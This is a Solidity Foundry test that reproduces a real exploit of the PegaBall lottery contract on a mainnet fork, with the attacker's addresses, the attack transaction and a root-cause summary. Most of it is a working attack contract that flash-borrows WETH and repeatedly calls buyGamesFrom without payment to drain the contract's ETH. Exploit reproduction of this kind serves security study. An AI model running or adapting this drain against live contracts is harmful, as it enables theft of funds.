// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1,512.85 USD
// Attacker : 0x28a8cB85d9d2C9ee536931De22Fe80e3EfEa3bD6
// Attack Contract : 0x60cbAA2594B2494fce81444697F10701E7B78a31
// Vulnerable Contract : 0x29003DD6B9970AD658314fFFB61E42F352C41630
// Attack Tx : https://etherscan.io/tx/0x3cecc3f347edff1d27a0c929f2e7a4c04522afb3a74e24db94684cb6b51b1d65
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x29003DD6B9970AD658314fFFB61E42F352C41630#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1229
//
// Attack summary: The attacker flash-borrowed WETH, registered as a PegaBall vendor, then repeatedly called
// buyGamesFrom(uint256) without paying msg.value, extracting vendor and referrer cuts from the proxy balance.
// Root cause: buyGamesFrom checked the buyer's ETH balance and self-funded the purchase via payable(this).call,
// rather than requiring the caller to send the ticket price as msg.value.

address constant ATTACKER = 0x28a8cB85d9d2C9ee536931De22Fe80e3EfEa3bD6;
address constant PEGA_BALL_PROXY = 0xB8fCABf7bd88A2489fAfBafA5f9A05a0e068cB5E;
address constant UNI_V2_WETH_USDT_PAIR = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

interface IPegaBall {
    function vendorRegistration(address referrer, address receiverWallet) external;
    function buyGamesFrom(
        uint256 amount
    ) external payable;
    function gamePrice() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 22_626_977;
        vm.createSelectFork("mainnet", forkBlock);

        vm.label(ATTACKER, "Attacker");
        vm.label(PEGA_BALL_PROXY, "PegaBall Proxy");
        vm.label(UNI_V2_WETH_USDT_PAIR, "Uniswap V2 WETH/USDT Pair");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public {
        uint256 attackerBalanceBefore = ATTACKER.balance;
        uint256 proxyBalanceBefore = PEGA_BALL_PROXY.balance;

        // step 1: run the attacker-controlled helper that performs the WETH flash swap and PegaBall calls.
        PegaBallAttack attackHelper = new PegaBallAttack(ATTACKER);
        attackHelper.execute();

        // step 2: assert that the same vulnerable buy path moved ETH from PegaBall to the attacker.
        uint256 attackerProfit = ATTACKER.balance - attackerBalanceBefore;
        assertGt(attackerProfit, 0.5 ether);
        assertLt(PEGA_BALL_PROXY.balance, proxyBalanceBefore);
    }
}

contract PegaBallAttack {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    receive() external payable {}

    function execute() external {
        uint256 wethToBorrow = 0.7 ether;
        IUniswapV2Pair(UNI_V2_WETH_USDT_PAIR).swap(wethToBorrow, 0, address(this), abi.encode(address(this)));
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == UNI_V2_WETH_USDT_PAIR, "unexpected callback");

        // step 3: unwrap the borrowed WETH and register the helper as a vendor with attacker payout routing.
        IWETH(payable(WETH_TOKEN)).withdraw(amount0);
        IPegaBall pegaBall = IPegaBall(PEGA_BALL_PROXY);
        pegaBall.vendorRegistration(address(this), profitReceiver);

        // step 4: drain repeated vendor/referrer cuts without sending msg.value for the ticket purchases.
        uint256 gamePrice = pegaBall.gamePrice();
        while (true) {
            uint256 amountFromProxyBalance = PEGA_BALL_PROXY.balance / gamePrice;
            if (amountFromProxyBalance <= 60) break;
            pegaBall.buyGamesFrom(amountFromProxyBalance - 1);
        }

        // step 5: repay the WETH flash swap using the historical helper's overpayment formula, then forward ETH.
        uint256 repayAmount = (amount0 * 1004) / 1000 + 1;
        IWETH(payable(WETH_TOKEN)).deposit{value: repayAmount}();
        IWETH(payable(WETH_TOKEN)).transfer(UNI_V2_WETH_USDT_PAIR, repayAmount);

        (bool success,) = payable(profitReceiver).call{value: address(this).balance}("");
        require(success, "profit transfer failed");
    }
}
